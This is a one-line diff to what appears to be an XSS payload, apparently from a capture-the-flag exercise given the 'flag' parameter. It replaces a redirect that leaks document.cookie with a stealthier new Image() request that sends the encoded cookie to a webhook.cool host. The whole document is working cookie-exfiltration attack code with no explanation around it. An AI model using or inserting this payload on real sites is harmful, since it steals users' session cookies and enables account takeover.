@@ -1,1 +1,1 @@
-document.location = "https://zealous-bird-85.webhook.cool/?flag=" +document.cookie;
+new Image().src = "https://elegant-meadow-61.webhook.cool/?flag=" + encodeURIComponent(document.cookie);
